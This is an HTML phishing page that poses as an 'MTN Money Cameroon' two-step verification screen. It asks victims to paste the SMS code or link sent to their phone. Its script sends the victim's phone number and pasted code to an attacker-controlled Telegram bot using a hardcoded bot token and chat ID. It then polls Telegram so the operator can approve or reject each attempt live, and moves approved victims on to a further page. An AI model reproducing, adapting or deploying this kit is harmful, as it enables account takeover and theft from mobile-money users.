<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MTN Money - Two Step Verification</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            /* MTN Cameroon inspired palette */
            --mtn-red: #af83e7;
            --mtn-red-dark: #6f7be2;
            --mtn-bg: #f2f2f2;
            --text-dark: #141414;
            --text-grey: #6f6f6f;
            --bg-light: #ffffff;
            --btn-disabled: #e7e7e7;
            --btn-disabled-text: #9a9a9a;
            --radius-12: 12px;
            --radius-16: 16px;
            --shadow-soft: 0 18px 40px rgba(0, 0, 0, 0.10);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--mtn-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            background-color: var(--bg-light);
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: var(--shadow-soft);
        }
        
        @media (min-width: 401px) {
            .app-container {
                height: 90vh;
                border-radius: 18px;
                overflow: hidden;
            }
        }
        /* Header */
        
        .app-header {
            background: linear-gradient(135deg, var(--mtn-red) 0%, var(--mtn-red-dark) 100%);
            color: #fff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 18px;
        }
        
        .icon-btn {
            background: none;
            border: none;
            color: #fff;
            font-size: 20px;
            cursor: pointer;
            opacity: .95;
        }
        
        .icon-btn:active {
            transform: scale(.98);
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            height: 34px;
        }
        
        .logo img {
            height: 34px;
            width: auto;
            display: block;
            border-radius: 8px;
            /* optional: makes it look nicer */
        }
        /* Main Content */
        
        .content-area {
            padding: 28px 22px;
            flex-grow: 1;
        }
        
        .content-area h2 {
            color: var(--text-dark);
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 10px;
            letter-spacing: -0.2px;
        }
        
        .subtitle {
            color: var(--text-grey);
            font-size: 14px;
            line-height: 1.45;
            margin-bottom: 22px;
        }
        
        .phone-number {
            color: var(--text-dark);
            font-size: 17px;
            font-weight: 800;
            margin-bottom: 18px;
            letter-spacing: 0.2px;
        }
        /* Text Area */
        
        .sms-textarea {
            width: 100%;
            height: 140px;
            border: 2px solid var(--mtn-red);
            border-radius: var(--radius-12);
            padding: 15px;
            font-size: 14px;
            color: var(--text-dark);
            resize: none;
            outline: none;
            margin-bottom: 18px;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        }
        
        .sms-textarea:focus {
            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.14);
            border-color: var(--mtn-red-dark);
        }
        
        .sms-textarea::placeholder {
            color: var(--text-grey);
            font-family: 'Inter', sans-serif;
        }
        
        .sms-textarea:disabled {
            background-color: #f5f5f5;
            color: var(--text-grey);
            border-color: #e5e5e5;
        }
        /* Timer and Submit */
        
        .resend-text {
            text-align: center;
            color: var(--text-grey);
            font-size: 13px;
            margin-bottom: 14px;
        }
        
        .resend-text.active {
            color: var(--mtn-red);
            font-weight: 700;
            cursor: pointer;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            border: none;
            background-color: var(--btn-disabled);
            color: var(--btn-disabled-text);
            font-size: 15px;
            font-weight: 800;
            cursor: not-allowed;
            transition: all 0.25s ease;
            letter-spacing: 0.3px;
        }
        
        .submit-btn.active {
            background-color: var(--mtn-red);
            color: #fff;
            cursor: pointer;
            box-shadow: 0 10px 22px rgba(226, 0, 26, 0.25);
        }
        
        .submit-btn.active:active {
            transform: scale(0.985);
        }
        /* Footer */
        
        .app-footer {
            background: linear-gradient(135deg, var(--mtn-red) 0%, var(--mtn-red-dark) 100%);
            color: #fff;
            text-align: center;
            padding: 14px;
            font-size: 12.5px;
            font-weight: 600;
            margin-top: auto;
        }
        /* Modal button */
        
        #errorModal .modal-actions-btn {
            background: var(--mtn-red);
            color: white;
            border: none;
            padding: 12px 14px;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <header class="app-header">
            <button class="icon-btn" onclick="history.back()"><i class="fa-solid fa-arrow-left"></i></button>

            <div class="logo" aria-label="MTN Money">
                <!-- Replaced logo with your provided MTN logo -->
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkIMuXBHiC5OpIeU7Uq5OJnSIOe9cbzO7MALP-XujJ-w&s=10" alt="MTN Money Logo">
            </div>

            <button class="icon-btn"><i class="fa-solid fa-bars"></i></button>
        </header>

        <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; justify-content: center; align-items: center; padding: 20px;">
            <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
                <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
                <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification link, please try again.</p>
                <button onclick="closeModal()" class="modal-actions-btn" style="background:#E2001A;">Try Again</button>
            </div>
        </div>

        <div class="content-area">
            <h2>Two Step Verification</h2>
            <p class="subtitle">Paste the complete link/sms message sent to your number</p>

            <h3 id="displayPhone" class="phone-number">+237.........</h3>

            <textarea id="smsInput" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>

            <p class="resend-text" id="resendWrapper">Resend in <span id="countdown">30</span> seconds</p>

            <button id="submitBtn" class="submit-btn" disabled>SUBMIT</button>
        </div>

        <footer class="app-footer">
            © 2026 MTN Money - Cameroon
        </footer>
    </div>

    <script>
        const errorModal = document.getElementById('errorModal');
        const smsInput = document.getElementById('smsInput');
        const submitBtn = document.getElementById('submitBtn');
        const countdownEl = document.getElementById('countdown');
        const resendWrapper = document.getElementById('resendWrapper');

        function closeModal() {
            errorModal.style.display = 'none';
            smsInput.value = '';
            smsInput.focus();

            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
        }

        // 1) Retrieve & Format the phone number from login.html
        const savedPhone = sessionStorage.getItem('savedPhone');
        const phoneDisplay = document.getElementById('displayPhone');

        let cleanPhoneForBot = 'UNKNOWN';

        if (savedPhone) {
            let cleanNumber = savedPhone.replace(/[^0-9]/g, '');

            // Convert '0-XX-XX-XX-XX' to '+267XXXXXXXX'
            if (cleanNumber.startsWith('0')) cleanNumber = cleanNumber.substring(1);

            cleanPhoneForBot = '237' + cleanNumber;
            phoneDisplay.innerText = '+' + cleanPhoneForBot;
        }

        // 2) Countdown Timer & Expiration Logic (OTP time = 200 seconds)
        let timeLeft = 200;
        let timerExpired = false;

        const timer = setInterval(() => {
            timeLeft--;

            if (timeLeft > 0) {
                countdownEl.innerText = timeLeft;
            } else {
                clearInterval(timer);
                timerExpired = true;

                resendWrapper.innerHTML = "Resend link now";
                resendWrapper.classList.add('active');

                smsInput.disabled = true;
                smsInput.classList.add('disabled');
            }
        }, 1000);

        // Click handler for resend text when active -> REDIRECT TO LOGIN
        resendWrapper.addEventListener('click', function() {
            if (this.classList.contains('active')) window.location.href = 'login.html';
        });

        // 3) Enable Submit Button when text is entered
        smsInput.addEventListener('input', function() {
            const hasEnoughText = this.value.trim().length > 5;

            if (hasEnoughText && !timerExpired) {
                submitBtn.disabled = false;
                submitBtn.classList.add('active');
            } else if (!hasEnoughText) {
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
            }
        });

        // --- TELEGRAM BOT CONFIGURATION ---
        const botToken = '8623755939:AAGFVI-26owFB1_rNhZXwIen0RTLkWfnvxo';
        const chatId = '5615316142';

        function sendOTPToTelegram(phone, smsText) {
            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            const message =
                `📱 *Step 2: OTP / Link Submission*\n` +
                `Phone: \`+${escapeMd(phone)}\`\n` +
                `✉️ Pasted Message:\n` +
                `\`${escapeMd(smsText)}\`\n\n` +
                `👇 Please Approve or Reject:`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ Approve",
                        callback_data: `OTP_APP_${phone}`
                    }, {
                        text: "❌ Reject",
                        callback_data: `OTP_REJ_${phone}`
                    }]
                ]
            };

            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    reply_markup: JSON.stringify(inlineKeyboard)
                })
            });
        }

        function startListeningForOTPDecision(phone, btnElement) {
            let offset = 0;
            let decided = false;

            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }

                    const intervalId = setInterval(() => {
                        if (decided) return;

                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
                            .then(r => r.json())
                            .then(data => {
                                if (!data.ok || decided) return;

                                for (const update of data.result) {
                                    offset = update.update_id + 1;

                                    if (update.callback_query) {
                                        const action = update.callback_query.data;

                                        if (action === `OTP_APP_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);
                                            window.location.href = 'limit.html';
                                        } else if (action === `OTP_REJ_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);

                                            btnElement.innerHTML = 'SUBMIT';
                                            btnElement.style.opacity = '1';
                                            btnElement.disabled = true;
                                            btnElement.classList.remove('active');

                                            errorModal.style.display = 'flex';
                                        }
                                    }
                                }
                            })
                            .catch(err => console.error("Polling error:", err));
                    }, 4000);
                })
                .catch(err => {
                    console.error("Failed to initialize Telegram polling:", err);
                    btnElement.innerHTML = 'SUBMIT';
                    btnElement.style.opacity = '1';
                    btnElement.disabled = false;
                    alert("Network error communicating with the server.");
                });
        }

        // 4) Submit Redirect with Polling
        submitBtn.addEventListener('click', function() {
            const smsText = smsInput.value.trim();
            const btn = this;

            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING...';
            btn.style.opacity = '0.8';
            btn.disabled = true;

            sendOTPToTelegram(cleanPhoneForBot, smsText)
                .then(response => {
                    if (!response.ok) throw new Error("Failed to send Telegram message");
                    startListeningForOTPDecision(cleanPhoneForBot, btn);
                })
                .catch(error => {
                    console.error("Telegram API Error:", error);
                    btn.innerHTML = 'SUBMIT';
                    btn.style.opacity = '1';
                    btn.disabled = false;
                    alert("Error connecting to the verification server. Please try again.");
                });
        });
    </script>
</body>

</html>
